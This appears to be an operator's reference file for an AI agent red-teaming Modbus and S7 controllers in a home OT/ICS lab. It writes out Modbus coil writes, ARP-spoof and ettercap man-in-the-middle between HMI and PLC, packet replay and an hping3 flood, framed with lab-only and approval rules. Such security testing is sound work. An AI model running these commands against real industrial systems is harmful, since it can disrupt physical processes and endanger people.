# KALI.md — Red-Team Reference for OT/ICS Lab

_Reference for any OpenClaw agent working with the Kali container against the home lab PLCs and Modbus servers. **Authorized lab use only** — never point these tools at infrastructure you don't own._

---

## The Rig: `kali-red`

A persistent, capability-enabled Kali container with the full ICS arsenal pre-installed.

| Property | Value |
|---|---|
| Image | `kali-red:latest` |
| Container | `kali-red` (persistent, `--restart unless-stopped`) |
| Network | host (direct access to `192.168.1.0/24`) |
| Capabilities | `NET_RAW`, `NET_ADMIN` (raw sockets, MITM) |
| Mount | `~/engagements` → `/engagements` |
| Dockerfile | `~/agents/kali-red/Dockerfile` |
| Wrapper | `~/bin/kali` |

### Quick Use

```bash
kali                          # interactive shell inside container
kali nmap -sV -p 502 192.168.1.95
kali -c 'cmd1; cmd2 | cmd3'   # shell pipeline
```

### Rebuild / Reset

```bash
sg docker -c "docker build -t kali-red:latest ~/agents/kali-red"
sg docker -c "docker rm -f kali-red"
sg docker -c "docker run -d --name kali-red --network host \
  --cap-add=NET_RAW --cap-add=NET_ADMIN \
  -v /home/claw/engagements:/engagements \
  --restart unless-stopped kali-red:latest sleep infinity"
```

---

## Installed Arsenal

### Network & generalist
`nmap`, `masscan`, `hping3`, `tcpdump`, `tshark`, `netcat`, `socat`, `hydra`, `nikto`, `sqlmap`, `metasploit-framework`, `searchsploit` (exploitdb), `snmpwalk`, `snmpcheck`

### MITM / replay
`ettercap-text-only`, `bettercap`, `arpspoof`, `dsniff`, `tcpreplay`

### Python ICS stack (system-wide pip)
`pymodbus`, `pysnmp`, `scapy`, `cpppo` (EtherNet/IP, CIP), `opcua`, `python-snap7` (Siemens S7), `boofuzz`

### Specialized ICS tooling (`/opt/`)
- `/opt/isf` — Industrial Exploitation Framework
- `/opt/plcscan` — Modbus/S7 device discovery
- `/opt/ics-scripts` — Tijl Deneut's ICS security script collection

---

## Reconnaissance

### Network discovery

```bash
# Sweep the lab subnet
kali nmap -sn 192.168.1.0/24 -oA /engagements/ot-lab-192.168.1.95/recon/sweep

# Targeted: full TCP, services, OS
kali nmap -sS -sV -O -p- --reason -oA /engagements/ot-lab-192.168.1.95/recon/tcp-full 192.168.1.95

# ICS-protocol sweep across subnet
kali nmap -sS -p 102,502,1911,4840,20000,44818,47808 --open \
  -oA /engagements/ot-lab-192.168.1.95/recon/ics-ports 192.168.1.0/24
```

### ICS-specific NSE scripts

```bash
kali nmap -p 502 --script modbus-discover --script-args=modbus-discover.aggressive=true 192.168.1.95
kali nmap -p 102 --script s7-info 192.168.1.95
kali nmap -p 44818 --script enip-info 192.168.1.95
kali nmap -p 47808 --script bacnet-info 192.168.1.95
```

### Passive capture

```bash
kali -c 'tcpdump -i any -w /engagements/ot-lab-192.168.1.95/pcap/lab.pcap "port 502 or port 102 or port 44818 or port 20000"'

# Triage with tshark
kali -c 'tshark -r /engagements/ot-lab-192.168.1.95/pcap/lab.pcap -Y modbus -T fields -e ip.src -e ip.dst -e modbus.func_code | sort -u'
```

---

## Modbus Operations

### Read holding registers (one-liner)

```bash
kali -c "python3 -c \"from pymodbus.client import ModbusTcpClient as M; c=M('192.168.1.95',502); c.connect(); print(c.read_holding_registers(0,10,slave=1).registers); c.close()\""
```

### Interactive pymodbus console

```bash
kali pymodbus.console tcp --host 192.168.1.95 --port 502
# inside:
# client.read_coils(0, 16, slave=1)
# client.read_holding_registers(0, 32, slave=1)
# client.read_input_registers(0, 32, slave=1)
# client.read_discrete_inputs(0, 16, slave=1)
```

### Metasploit ICS modules

```bash
kali msfconsole -q -x "use auxiliary/scanner/scada/modbusdetect; set RHOSTS 192.168.1.95; run; exit"
kali msfconsole -q -x "use auxiliary/scanner/scada/modbusclient; set RHOSTS 192.168.1.95; set ACTION READ_COILS; set NUMBER 16; run; exit"
```

### Writes — handle with care ⚠️

```bash
# ALWAYS snapshot first; ALWAYS log to engagements/.../writes.log
kali -c "python3 -c \"from pymodbus.client import ModbusTcpClient as M; c=M('192.168.1.95',502); c.connect(); c.write_coil(0,True,slave=1); c.close()\""
```

---

## Advanced Techniques

### A. Function code fuzzing
`boofuzz` is installed. Sample harness lives at `/engagements/<name>/scripts/modbus_fuzz.py`.

### B. Slave ID enumeration
`nmap modbus-discover --script-args aggressive=true` walks 1-247. Earlier scan of `.95` shows it's a `pymodbus` server impersonating multiple slave IDs — useful test target.

### C. Coil/register address-space walk
Custom Python: enumerate 0-65535 in blocks of 100, record what reads succeed. Dump to CSV.

### D. Man-in-the-middle (HMI ↔ PLC)
```bash
# 1. ARP-spoof
kali -c 'arpspoof -i eth0 -t <HMI_IP> -r <PLC_IP>'
# 2. Run transparent Modbus proxy (custom) to modify in-flight values
# 3. ettercap with modbus filter
kali ettercap -T -M arp:remote /<HMI_IP>// /<PLC_IP>//
```

### E. Replay attack
```bash
kali -c 'tcpreplay -i eth0 /engagements/.../pcap/hmi_commands.pcap'
```

### F. DoS / session-exhaustion
```bash
kali hping3 -S -p 502 --flood 192.168.1.95   # ⚠️ disruptive
```

### G. Protocol-stack vulnerabilities
```bash
kali nmap --script vuln -p 502 192.168.1.95
kali searchsploit modbus
kali searchsploit siemens s7
```

---

## Tactical Sequence

1. **Map** — `nmap -sn` subnet, then ICS-port sweep
2. **Enumerate** — `modbus-discover`, `s7-info`, banner grabs, identify firmware
3. **Baseline** — dump all coils + holding + input registers, save snapshot
4. **Assess** — cross-ref firmware with searchsploit / CISA advisories
5. **Active probe** — function-code mapping, web UI default creds, SNMP
6. **Controlled writes** — only with explicit Boss T approval, after snapshot
7. **Report** — MITRE ATT&CK for ICS mapping, screenshots, remediation

---

## Workspace Layout

```
engagements/<engagement-name>/
├── recon/         # nmap output, masscan, host lists
├── pcap/          # tcpdump captures
├── enumeration/   # device info, register dumps
├── baseline/      # pre-test state snapshots
├── exploits/      # POCs, write scripts
├── evidence/      # screenshots, before/after diffs
├── writes.log     # every write op with restore command
├── attck.md       # MITRE ATT&CK for ICS findings mapping
└── notes.md       # narrative log
```

---

## Agent Conventions

- **Default to read-only.** Any disruptive op requires explicit Boss T approval in the same turn.
- **Log every command.** Append to `engagements/<name>/notes.md` with timestamp.
- **Snapshot before writes.** Save current state; record the restore command.
- **Stay in the lab.** Never target IPs outside `192.168.1.0/24`. Confirm if unsure.
- **Use the wrapper.** `kali <cmd>` over raw docker exec — cleaner logs, consistent context.

---

## References

- **MITRE ATT&CK for ICS:** https://attack.mitre.org/matrices/ics/
- **CISA ICS advisories:** https://www.cisa.gov/news-events/cybersecurity-advisories
- **ISA/IEC 62443:** industrial security standard
- **Pymodbus:** https://pymodbus.readthedocs.io/
- **SANS ICS Cyber Kill Chain:** https://www.sans.org/white-papers/36297/

---

_Maintained by Albert. Built `2026-06-07`. Update as tactics evolve._
